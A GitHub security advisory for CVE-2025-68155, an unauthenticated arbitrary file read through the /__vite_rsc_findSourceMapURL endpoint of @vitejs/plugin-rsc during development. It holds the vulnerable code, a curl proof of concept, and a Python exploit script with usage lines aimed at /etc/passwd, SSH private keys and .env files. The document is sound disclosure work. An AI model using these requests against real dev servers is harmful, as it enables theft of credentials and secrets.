# [H] @vitejs/plugin-rsc has an Arbitrary File Read via `/__vite_rsc_findSourceMapURL` Endpoint

## Summary
Severity: High
Advisory: GHSA-g239-q96q-x4qm
CVE: CVE-2025-68155
CWE: CWE-22, CWE-73
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-12-16
Source: https://github.com/advisories/GHSA-g239-q96q-x4qm
Type: github-advisory

## Affected
- npm: `@vitejs/plugin-rsc` — affected >=0 <0.5.8

## Details
## Summary

The `/__vite_rsc_findSourceMapURL` endpoint in `@vitejs/plugin-rsc` allows **unauthenticated arbitrary file read** during development mode. An attacker can read any file accessible to the Node.js process by sending a crafted HTTP request with a `file://` URL in the `filename` query parameter.

**Severity:** High
**Attack Vector:** Network  
**Privileges Required:** None  
**Scope:** Development mode only (`vite dev`)

---

## Impact

### Who Is Affected?

- **All developers** using `@vitejs/plugin-rsc` during development
- Projects running `vite dev` with the RSC plugin enabled

### Attack Scenarios

1. **Network-Exposed Dev Servers:**  
   When developers run `vite --host 0.0.0.0` (common for mobile testing), attackers on the same network can read files.

2. ~**XSS-Based Attacks:**~
   ~If the application has an XSS vulnerability, malicious JavaScript can fetch sensitive files and exfiltrate them.~

3. ~**Malicious Dependencies:** ~
   ~A compromised npm package could include code that reads files during development.~

4. ~**DNS Rebinding:**~ (EDIT: This doesn't apply since https://github.com/vitejs/vite/pull/20222)
   ~An attacker could use DNS rebinding to access the localhost dev server from a malicious website.~

### What Can Be Leaked?

- Environment files (`.env`, `.env.local`, `.env.production`)
- SSH keys (`~/.ssh/id_rsa`, `~/.ssh/id_ed25519`)
- Cloud credentials (`~/.aws/credentials`, `~/.config/gcloud/`)
- Database passwords and API keys
- Source code from other projects
- System files (`/etc/passwd`, `/etc/shadow` if readable)

---

## Details

### Vulnerable Code Location

**File:** `packages/plugin-rsc/src/plugins/find-source-map-url.ts`  
**Lines:** 49-61

The vulnerability exists in the `findSourceMapURL` function:

```typescript
async function findSourceMapURL(
  server: ViteDevServer,
  filename: string,
  environmentName: string,
): Promise<object | undefined> {
  // this is likely server external (i.e. outside of Vite processing)
  if (filename.startsWith('file://')) {
    filename = fileURLToPath(filename)
    if (fs.existsSync(filename)) {
      // line-by-line identity source map
      const content = fs.readFileSync(filename, 'utf-8')  // ← ARBITRARY FILE READ
      return {
        version: 3,
        sources: [filename],
        sourcesContent: [content],  // ← FILE CONTENTS LEAKED HERE
        mappings: 'AAAA' + ';AACA'.repeat(content.split('\n').length),
      }
    }
    return
  }
  // ... rest of the function
}
```

### Root Cause

The endpoint:
1. Accepts a user-controlled `filename` parameter from the query string (line 20)
2. Checks if it starts with `file://` (line 49)
3. Converts it to a filesystem path using `fileURLToPath()` (line 50)
4. Reads the file with `fs.readFileSync()` **without any path validation** (line 53)
5. Returns the file contents in the JSON response (line 57)

**No validation is performed** to ensure the requested file is within the project directory or is a legitimate source file.

---

## PoC

### Quick Test (Single Command)

If you have a Vite dev server running with `@vitejs/plugin-rsc`, you can test immediately:

```bash
curl 'http://localhost:5173/__vite_rsc_findSourceMapURL?filename=file:///etc/passwd&environmentName=Server'
```

**Expected output** (file contents in `sourcesContent`):

```json
{
  "version": 3,
  "sources": ["/etc/passwd"],
  "sourcesContent": ["root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/sbin:..."],
  "mappings": "AAAA;AACA;AACA;..."
}
```

<details><summary>Further details of PoC</summary>

### Complete PoC with Docker

For a fully reproducible environment, I've prepared a complete PoC:

#### Step 1: Create a minimal `vite.config.ts`

```typescript
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-rsc'

export default defineConfig({
  plugins: [
    react({
      serverHandler: false,
    }),
  ],
})
```

#### Step 2: Create `package.json`

```json
{
  "name": "poc-vite-rsc-file-read",
  "version": "1.0.0",
  "private": true,
  "type": "module",
  "scripts": {
    "dev": "vite --host 0.0.0.0"
  },
  "dependencies": {
    "react": "^19.0.0",
    "react-dom": "^19.0.0"
  },
  "devDependencies": {
    "@vitejs/plugin-rsc": "latest",
    "vite": "^6.0.0"
  }
}
```

#### Step 3: Create minimal `index.html` and `src/main.tsx`

**index.html:**
```html
<!DOCTYPE html>
<html>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
```

**src/main.tsx:**
```tsx
import React from 'react'
import ReactDOM from 'react-dom/client'
ReactDOM.createRoot(document.getElementById('root')!).render(<div>PoC</div>)
```

#### Step 4: Start the server and exploit

```bash
# Install and start
pnpm install
pnpm dev

# In another terminal, exploit:
curl 'http://localhost:5173/__vite_rsc_findSourceMapURL?filename=file:///etc/passwd&environmentName=Server'
```

### Python Exploit Script

For easier testing, here's a Python script:

```python
#!/usr/bin/env python3
"""Exploit: Arbitrary File Read via /__vite_rsc_findSourceMapURL"""

import json
import sys
import urllib.request
import urllib.parse

def read_file(host, port, file_path):
    """Read a file from the target server via the vulnerability."""
    url = f"http://{host}:{port}/__vite_rsc_findSourceMapURL"
    params = urllib.parse.urlencode({
        'filename': f'file://{file_path}',
        'environmentName': 'Server'
    })
    
    try:
        with urllib.request.urlopen(f"{url}?{params}", timeout=10) as response:
            data = json.loads(response.read().decode('utf-8'))
            if 'sourcesContent' in data and data['sourcesContent']:
                return data['sourcesContent'][0]
    except Exception as e:
        return f"Error: {e}"
    return None

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    port = sys.argv[2] if len(sys.argv) > 2 else '5173'
    file_path = sys.argv[3] if len(sys.argv) > 3 else '/etc/passwd'
    
    content = read_file(host, port, file_path)
    if content:
        print(f"[+] Successfully read {file_path}:")
        print("-" * 60)
        print(content)
        print("-" * 60)
    else:
        print(f"[-] Failed to read {file_path}")
```

**Usage:**
```bash
python3 exploit.py localhost 5173 /etc/passwd
python3 exploit.py localhost 5173 /root/.ssh/id_rsa
python3 exploit.py localhost 5173 /home/user/.env
```

### Verified Exploitation Results

I tested this in a Docker container and successfully read:

| File | Description |
|------|-------------|
| `/etc/passwd` | System user accounts |
| `/etc/hosts` | Network configuration |
| `/root/.env.secret` | Environment secrets |
| `/root/.ssh/id_rsa` | SSH private keys |
| `/proc/self/environ` | Process environment variables |
| Source code files | Any file in the filesystem |

**Example output from `/etc/passwd`:**

```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
```

**Example output from sensitive secrets file:**

```
SECRET_API_KEY=sk-live-very-secret-key-12345
DB_PASSWORD=super_secret_password
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

</details>

---

## References
- https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-g239-q96q-x4qm
- https://nvd.nist.gov/vuln/detail/CVE-2025-68155
- https://github.com/facebook/react/pull/29708
- https://github.com/facebook/react/pull/30741
- https://github.com/vitejs/vite-plugin-react/commit/582fba0b9a52b13fcff6beaaa3bfbd532bc5359d
- https://github.com/vitejs/vite-plugin-react
